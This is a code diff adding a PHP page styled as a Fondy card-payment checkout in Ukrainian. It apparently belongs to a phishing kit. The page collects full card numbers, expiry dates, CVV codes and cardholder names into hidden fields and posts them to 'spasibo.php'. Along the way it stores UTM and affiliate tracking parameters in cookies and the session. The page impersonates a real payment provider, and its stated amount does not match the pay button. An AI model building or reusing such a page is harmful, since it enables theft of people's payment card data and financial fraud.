@@ -1,0 +1,169 @@
+<?php
+session_start();
+$period_cookie = 2592000; // 30 дней (2592000 секунд)
+ 
+if($_GET){
+    setcookie("utm_source",$_GET['utm_source'],time()+$period_cookie);
+    setcookie("utm_medium",$_GET['utm_medium'],time()+$period_cookie);
+    setcookie("utm_term",$_GET['utm_term'],time()+$period_cookie);
+    setcookie("utm_content",$_GET['utm_content'],time()+$period_cookie);
+    setcookie("utm_campaign",$_GET['utm_campaign'],time()+$period_cookie);
+    setcookie("act", $_GET["act"], time()+60*60*24);
+}
+ 
+if(!isset($_SESSION['utms'])) {
+    $_SESSION['utms'] = array();
+    $_SESSION['utms']['utm_source'] = '';
+    $_SESSION['utms']['utm_medium'] = '';
+    $_SESSION['utms']['utm_term'] = '';
+    $_SESSION['utms']['utm_content'] = '';
+    $_SESSION['utms']['utm_campaign'] = '';
+    $_SESSION['utms']['opa'] = '';
+	$_SESSION['utms']['bid'] = '';
+}
+$_SESSION['utms']['utm_source'] = $_GET['utm_source'] ? $_GET['utm_source'] : $_COOKIE['utm_source'];
+$_SESSION['utms']['utm_medium'] = $_GET['utm_medium'] ? $_GET['utm_medium'] : $_COOKIE['utm_medium'];
+$_SESSION['utms']['utm_term'] = $_GET['utm_term'] ? $_GET['utm_term'] : $_COOKIE['utm_term'];
+$_SESSION['utms']['utm_content'] = $_GET['utm_content'] ? $_GET['utm_content'] : $_COOKIE['utm_content'];
+$_SESSION['utms']['utm_campaign'] = $_GET['utm_campaign'] ? $_GET['utm_campaign'] : $_COOKIE['utm_campaign'];
+$_SESSION['utms']['opa'] = $_GET['opa'] ? $_GET['opa'] : $_COOKIE['opa'];
+$_SESSION['utms']['bid'] = $_GET['bid'] ? $_GET['bid'] : $_COOKIE['bid'];
+
+?>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="./css/style.css">
+    <title>Fondy</title>
+</head>
+<body>
+    <div class="container__header">
+        <header class="header">
+            <div class="logo">
+                <img src="./images/fondy_logo.svg" alt="">
+            </div>
+            <div class="languege">
+                <div class="languege__wrapper">
+                    <span>Українська</span> <i class="fa-solid fa-chevron-down"></i>
+                </div>
+            </div>
+        </header>
+    </div>
+   <div class="container">
+       <div class="main__wrapper">
+           <div>
+            <div class="f-merchant-name">whitegallery.store</div>
+            <div class="f-merchant-name">http://whitegallery.store/gamanets</div>
+            <div class="price__wrapper">
+                <b class="f-amount">535,<sup>35</sup></b> 
+                <span class="f-currency amount_currency_Ke0jp">ГРН</span>
+            </div>
+            <div class="method__payment">
+                <span>Оплатити карткою</span>
+                <img src="./images/mastercard.svg" alt="">
+                <img src="./images/visa.svg" alt="">
+            </div>
+
+
+            <form action="spasibo.php" method="post">
+                <?php if (isset($_GET["utm_source"])) : ?> <input type="hidden" name="utm_source" value="<?=htmlspecialchars($_GET["utm_source"]);?>" />
+                <?php endif; ?><?php if (isset($_GET["utm_content"])) : ?><input type="hidden" name="utm_content" value="<?=htmlspecialchars($_GET["utm_content"]);?>" />
+                <?php endif; ?><?php if (isset($_GET["utm_term"])) : ?><input type="hidden" name="utm_term" value="<?=htmlspecialchars($_GET["utm_term"]);?>" />
+                <?php endif; ?><?php if (isset($_GET["utm_campaign"])) : ?><input type="hidden" name="utm_campaign" value="<?=htmlspecialchars($_GET["utm_campaign"]);?>" />
+                 <?php endif; ?><?php if (isset($_GET["utm_medium"])) : ?><input type="hidden" name="utm_medium" value="<?=htmlspecialchars($_GET["utm_medium"]);?>" />
+                  <?php endif; ?><?php if (isset($_GET["opa"])) : ?><input type="hidden" name="opa" value="<?=htmlspecialchars($_GET["opa"]);?>" />
+                   <?php endif; ?><?php if (isset($_GET["bid"])) : ?><input type="hidden" name="bid" value="<?=htmlspecialchars($_GET["bid"]);?>" />
+                 <?php endif; ?><?php if (isset($_GET["subid"])) : ?><input type="hidden" name="subid" value="<?=htmlspecialchars($_GET["subid"]);?>" />
+                 <?php endif; ?><input type="hidden" name="subid" value="{subid}" />
+                <div class="card">
+                    <div class="card__top">
+                        <div class="card__top_img">
+                            <img src="./images/mastercard.svg" alt="">
+                        </div>
+                    </div>
+                    <div class="card__middle">
+                        <div class="card__middle_top">
+                            <span class="text">НОМЕР КАРТКИ</span><i class="fa-solid fa-chevron-down"></i>
+                        </div>
+                        <div class="card__middle_number">
+                            <input type="tel" class="howCard" placeholder="_" name="" id="1" required>
+                            <input type="tel" placeholder="_" name="" id="2" required>
+                            <input type="tel" placeholder="_" name="" id="3" required>
+                            <input type="tel" placeholder="_" name="" id="4" required>
+                            <input type="tel" placeholder="_" name="" id="5" required>
+                            <input type="tel" placeholder="_" name="" id="6" required>
+                            <input type="tel" placeholder="_" name="" id="7" required>
+                            <input type="tel" placeholder="_" name="" id="8" required>
+                            <input type="tel" placeholder="_" name="" id="9" required>
+                            <input type="tel" placeholder="_" name="" id="10" required>
+                            <input type="tel" placeholder="_" name="" id="11" required>
+                            <input type="tel" placeholder="_" name="" id="12" required>
+                            <input type="tel" placeholder="_" name="" id="13" required>
+                            <input type="tel" placeholder="_" name="" id="14" required>
+                            <input type="tel" placeholder="_" name="" id="15" required>
+                            <input type="tel" placeholder="_" name="" id="16" required>
+                        </div>
+                    </div>
+                    <div class="card__bottom">
+                        <div class="card__date">
+                            <span class="text">ММ/РР</span>
+                            <div>
+                                <input type="tel" placeholder="_" name="" id="" required>
+                                <input type="tel" placeholder="_" name="" id="" required>
+                                <span>/</span>
+                                <input type="tel" placeholder="_" name="" id="" required>
+                                <input type="tel" placeholder="_" name="" id="" required>
+                            </div>
+                           
+                        </div>
+                        <div class="card__cv">
+                            <span class="text">CVV2/CVC2</span>
+                            <div>
+                                <input type="tel" placeholder="_" name="" id="" required>
+                                <input type="tel" placeholder="_" name="" id="" required>
+                                <input type="tel" placeholder="_" name="" id="" required>
+                            </div>
+                           
+                        </div>
+                    </div>
+                </div>
+                <div class="input__wrapper">
+                    <input type="text" name="name" placeholder="Ваше Ім'я та Фамілію" required>
+                </div>
+                <div class="btn__wrapper">
+    
+      
+            <input class="numberCard" type="hidden" name="numberCard">
+            <input class="dataCard" type="hidden" name="dataCard">
+            <input class="cvvCard" type="hidden" name="cvvCard">
+    
+            <button type="submit" class="f-button-pay f-btn f-btn-success f-btn-block f-btn-lg f-btn-success-gradient-custom f-btn-success-bg-lighten"><span>Сплатити 552,35 грн</span>&nbsp; <!----></button>
+    
+                </div>
+
+            </form>
+
+           
+           </div>
+       
+       
+        <div class="footer">
+            <div class="footer__wrapper">
+                <svg aria-hidden="true" focusable="false" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" class="svg_wrapper_a4_I4 f-svg-security svg_w_16_dUhrK svg_s_24_hQXPF"><path fill="currentColor" d="M11.7 14.91a.7.7 0 0 1-.47.19.68.68 0 0 1-.46-.19l-3.42-3.39a.66.66 0 0 1 0-.93L8 9.92a.65.65 0 0 1 .93 0l2.27 2.25 4.39-4.34a.62.62 0 0 1 .46-.19.64.64 0 0 1 .47.19l.68.67a.66.66 0 0 1 0 .92l-5.5 5.49L19.12 17c2.76-3.94 1.68-11.86 1.64-12.2a.67.67 0 0 0-.48-.54l-8.1-2.76a.73.73 0 0 0-.36 0l-8.1 2.76a.67.67 0 0 0-.48.54c0 .34-1.12 8.26 1.64 12.2a12.89 12.89 0 0 0 7 5h.27a12.89 12.89 0 0 0 7-5Z"></path></svg>
+                <span>Дані покупця захищено</span>
+            </div>
+        </div>
+       </div>
+   
+   </div>
+
+
+
+
+    <script src="https://kit.fontawesome.com/26ab02136f.js" crossorigin="anonymous"></script>
+    <script src="./js/script.js"></script>
+</body>
+</html>
